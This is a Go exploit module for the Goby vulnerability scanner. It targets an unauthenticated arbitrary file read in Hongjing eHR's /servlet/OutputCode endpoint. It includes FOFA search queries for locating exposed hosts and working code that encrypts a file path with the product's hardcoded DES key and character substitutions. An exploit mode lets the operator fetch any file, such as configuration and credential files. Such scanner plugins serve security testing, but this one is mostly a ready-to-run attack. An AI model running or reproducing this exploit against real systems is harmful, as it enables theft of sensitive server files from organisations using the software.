package exploits

import (
	"bytes"
	"crypto/cipher"
	"crypto/des"
	"encoding/base64"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Hongjing eHR /servlet/OutputCode File Read Vulnerability",
    "Description": "<p>There is an arbitrary file reading vulnerability in the Hongjing eHR OutputCode interface, through which an unauthenticated attacker can read important system files (such as database configuration files, system configuration files, database configuration files, etc.), resulting in extremely insecure websites.</p>",
    "Product": "Hongjing eHR ",
    "Homepage": "http://www.hjsoft.com.cn/",
    "DisclosureDate": "2024-10-25",
    "PostTime": "2024-11-01",
    "Author": "wangzhao@baimaohui.net",
    "FofaQuery": "title=\"人力资源\" && body=\"人力资源\"",
    "GobyQuery": "title=\"人力资源\" && body=\"人力资源\"",
    "Level": "1",
    "Impact": "<p>Download any server files, including source code files, sensitive system files, configuration files, and more.</p>",
    "Recommendation": "<p>1. Let web users only access (read) the files and paths they need  </p><p> 2. There can be no file containing vulnerabilities, directory traversal vulnerabilities or other vulnerabilities  </p><p> 3. Make it impossible for users to access paths other than the root directory of the web.</p>",
    "References": [
        "https://blog.csdn.net/qq_41904294/article/details/139083090"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "win.ini,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "C:/Windows/win.ini",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.4",
    "Translation": {
        "CN": {
            "Name": "宏景eHR /servlet/OutputCode 文件读取漏洞",
            "Product": "宏景eHR",
            "Description": "<p>宏景eHR OutputCode接口处存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件(如数据库配置文件、系统配置文件)、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "Recommendation": "<p>1、让web 用户只能访问（读取），所需要的文件和路径&nbsp;</p><p>2、不能有文件包含漏洞，目录遍历漏洞或其他漏洞&nbsp;</p><p>3、让用户不能访问Web 根目录以外的路径。<br></p>",
            "Impact": "<p>下载服务器任意文件，包括源代码文件、系统敏感文件、配置文件等等。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Hongjing eHR /servlet/OutputCode File Read Vulnerability",
            "Product": "Hongjing eHR ",
            "Description": "<p>There is an arbitrary file reading vulnerability in the Hongjing eHR OutputCode interface, through which an unauthenticated attacker can read important system files (such as database configuration files, system configuration files, database configuration files, etc.), resulting in extremely insecure websites.<br></p>",
            "Recommendation": "<p>1. Let web users only access (read) the files and paths they need&nbsp;&nbsp;</p><p>&nbsp;2. There can be no file containing vulnerabilities, directory traversal vulnerabilities or other vulnerabilities&nbsp;&nbsp;</p><p>&nbsp;3. Make it impossible for users to access paths other than the root directory of the web.<br></p>",
            "Impact": "<p>Download any server files, including source code files, sensitive system files, configuration files, and more.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9968"
}`

	postOrGet_m9jXTEDGmn := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}

		header := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25",
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
			"Accept-Language": "zh-CN,zh;q=0.9",
			"Connection":      "close",
		}
		encryptDataFunc := func(data string) string {
			pad := func(src []byte, blockSize int) []byte {
				padLen := blockSize - len(src)%blockSize
				padText := bytes.Repeat([]byte{byte(padLen)}, padLen)
				return append(src, padText...)
			}
			encrypt := func(key string, plaintext string) string {
				block, err := des.NewCipher([]byte(key[0:8]))
				if err != nil {
					panic(err)
				}

				iv := []byte{1, 2, 3, 4, 5, 6, 7, 8}
				mode := cipher.NewCBCEncrypter(block, iv)

				plaintextBytes := pad([]byte(plaintext), block.BlockSize())
				ciphertext := make([]byte, len(plaintextBytes))
				mode.CryptBlocks(ciphertext, plaintextBytes)

				return base64.StdEncoding.EncodeToString(ciphertext)
			}
			replaceCharacters := func(data string) string {
				replaced := data
				replacements := map[string]string{
					"%":    "@2HJ5@",
					"+":    "@2HJB@",
					" ":    "@2HJ0@",
					"/":    "@2HJF@",
					"?":    "@3HJF@",
					"#":    "@2HJ3@",
					"&":    "@2HJ6@",
					"=":    "@3HJD@",
					"\r\n": "",
					"\n":   "",
					"\r":   "",
					"@":    "PAATTP",
				}

				for old, new := range replacements {
					replaced = regexp.MustCompile(regexp.QuoteMeta(old)).ReplaceAllString(replaced, new)
				}
				replaced = strings.ReplaceAll(replaced, "@", "PAATTP")
				return replaced
			}
			encrypted := encrypt("ilovethisgame", fileUrl)
			replaced := replaceCharacters(encrypted)
			return replaced
		}
		fileUrl = encryptDataFunc(fileUrl)
		resp, err := setGetRequest(hostInfo, "/servlet/OutputCode?path="+fileUrl, header)
		if err != nil || resp.StatusCode != 200 {
			return "", err
		}

		// 注意：返回值为（最终要返回的读取结果，错误）
		return resp.RawBody, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/servlet/OutputCode?path="
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"C:/Windows/win.ini": "extensions",
			}
			// 函数继承
			uploadFileFunc := postOrGet_m9jXTEDGmn

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL + fileUrl
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])
			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"win.ini": {"C:/Windows/win.ini", "extensions"},
			}

			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_m9jXTEDGmn

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}
			expResult.Success = true
			expResult.Output = "敏感信息泄露\n" + resp
			return expResult
		},
	))
}
